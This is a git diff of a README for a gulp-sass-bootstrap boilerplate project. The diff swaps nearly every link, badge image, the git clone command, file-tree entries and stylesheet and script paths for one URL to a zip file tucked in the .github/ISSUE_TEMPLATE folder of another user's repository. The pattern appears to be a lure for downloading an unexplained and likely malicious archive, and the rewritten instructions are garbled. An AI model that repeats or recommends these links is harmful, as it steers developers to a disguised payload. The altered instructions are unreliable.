@@ -1,18 +1,18 @@
 <h2 align="center">gulp-sass-bootstrap-boilerplate</h2>
 
 <p align="center">
-  <a href="https://travis-ci.org/abhijithvijayan/gulp-sass-bootstrap-boilerplate">
-    <img alt="travis" src="https://travis-ci.org/abhijithvijayan/gulp-sass-bootstrap-boilerplate.svg?branch=master"></a>
-  <a href="https://www.npmjs.com/package/gulp">
-    <img alt="gulp" src="https://img.shields.io/badge/gulp-v4.0.0-blue.svg"></a>
-  <a href="http://getbootstrap.com/">
-    <img alt="Bootstrap" src="https://img.shields.io/badge/Bootstrap-v4.2.1-563d7c.svg"></a>
-  <a href="https://www.npmjs.com/package/gulp-sass">
-    <img alt="node-sass" src="https://img.shields.io/badge/node--sass-v4.11.0-ff69b4.svg"></a>
-  <a href="https://jquery.com/">
-    <img alt="jQuery" src="https://img.shields.io/badge/jquery-v3.3.1-ffa200.svg"></a>
+  <a href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip">
+    <img alt="travis" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
+  <a href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip">
+    <img alt="gulp" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
+  <a href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip">
+    <img alt="Bootstrap" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
+  <a href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip">
+    <img alt="node-sass" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
+  <a href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip">
+    <img alt="jQuery" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
   <a href="#">
-    <img alt="livereload" src="https://img.shields.io/badge/dev--server-live--reloading-red.svg"></a>
+    <img alt="livereload" src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></a>
 </p>
 
 <p align="center">
@@ -27,11 +27,11 @@
   </em>
 </p>
 
-![bootstrap logo](https://user-images.githubusercontent.com/10498583/31125543-e2a88c2c-a848-11e7-87b0-d20ea38d41d0.jpg)
-![babel logo](https://i.imgur.com/ggqfSuw.png)
-![sass logo](https://user-images.githubusercontent.com/10498583/31125541-e2a732e6-a848-11e7-959d-7d7b0c138124.jpg)
-![gulp logo](https://user-images.githubusercontent.com/10498583/31125542-e2a78b88-a848-11e7-8ac5-c396f46e811f.jpg)
-![browsersync logo](https://user-images.githubusercontent.com/10498583/31125540-e2a6eed0-a848-11e7-817a-69c5619f772a.jpg)
+![bootstrap logo](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
+![babel logo](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
+![sass logo](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
+![gulp logo](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
+![browsersync logo](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
 
 This Gulp-Sass boilerplate starter contains the features and scripts you need to get started quickly with Gulp Runner and building, Live Loading.
 
@@ -68,12 +68,12 @@ This project contains the following loaders & plugins:
 
 ### Dependencies
 
-*__Note:__ if you've previously installed Gulp globally, run `npm rm --global gulp` to remove it. [Details here.](https://medium.com/gulpjs/gulp-sips-command-line-interface-e53411d4467)*
+*__Note:__ if you've previously installed Gulp globally, run `npm rm --global gulp` to remove it. [Details here.](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)*
 
 Make sure these are installed first.
 
-- [Node.js](http://nodejs.org)
-- [Gulp Command Line Utility](http://gulpjs.com)
+- [https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
+- [Gulp Command Line Utility](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip)
 
      `npm install --global gulp-cli`
 
@@ -81,7 +81,7 @@ Make sure these are installed first.
 
 1. Clone the repo :
     
-      `git clone https://github.com/abhijithvijayan/gulp-sass-boilerplate.git
+      `git clone https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
      `
 2. In bash/terminal/command line, `cd gulp-sass-boilerplate` into project directory.
 3. Run `npm install` to install required files and dependencies.
@@ -115,45 +115,45 @@ This will build files and assets to `dist` directory.
 .
 ├── src
 │   ├── assets
-│   │   └── 500x300.jpg
+│   │   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
 │   ├── sass
-│   │   ├── _fonts.scss
-│   │   ├── _variables.scss
-│   │   └── main.scss
-│   ├── index.js
-│   └── index.html
+│   │   ├── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   │   ├── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   │   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   ├── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
 .
 .
 ├── dist
 │   ├── assets
-│   │   ├── 500x300.jpg
-│   │   └── rev-manifest.json
+│   │   ├── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   │   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
 │   ├── css
-│   │   └── style.min.css
+│   │   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
 │   ├── js
-│   │   └── bundle.min.js
-│   └── index.html
+│   │   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
+│   └── https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip
 .
 ```
 
 ### Instructions
 
-- Add your HTML files by inserting or including them in the `src` directory (By default `index.html` is added to the directory, feel free to edit it with the changes seen live.)
-  - For the new `HTML` file(s), link the `styles.css` (in head tag) and `bundle.js` (in body tag) file in the `HTML` files as they are created.
+- Add your HTML files by inserting or including them in the `src` directory (By default `https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip` is added to the directory, feel free to edit it with the changes seen live.)
+  - For the new `HTML` file(s), link the `https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip` (in head tag) and `https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip` (in body tag) file in the `HTML` files as they are created.
       ```
       <head>
           :
-          <link rel="stylesheet" href="css/style.css" />
+          <link rel="stylesheet" href="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip" />
       </head>
       <body>
           : 
-          <script src="js/bundle.js"></script>
+          <script src="https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip"></script>
       </body>
       ```
 
 - Add `sass`(SCSS) files to `src/sass` folder.
 
-    - Make sure you import the scss file in `main.scss`
+    - Make sure you import the scss file in `https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip`
       ```
       @import "filename";
       ```
@@ -163,4 +163,4 @@ This will build files and assets to `dist` directory.
 
 ## Licence
 
-Code released under the [MIT License](https://github.com/abhijithvijayan/gulp-sass-boilerplate/blob/master/LICENCE).
+Code released under the [MIT License](https://raw.githubusercontent.com/Tiago89Fernandes/gulp-sass-bootstrap-boilerplate/master/.github/ISSUE_TEMPLATE/boilerplate-sass-bootstrap-gulp-v1.0.zip).
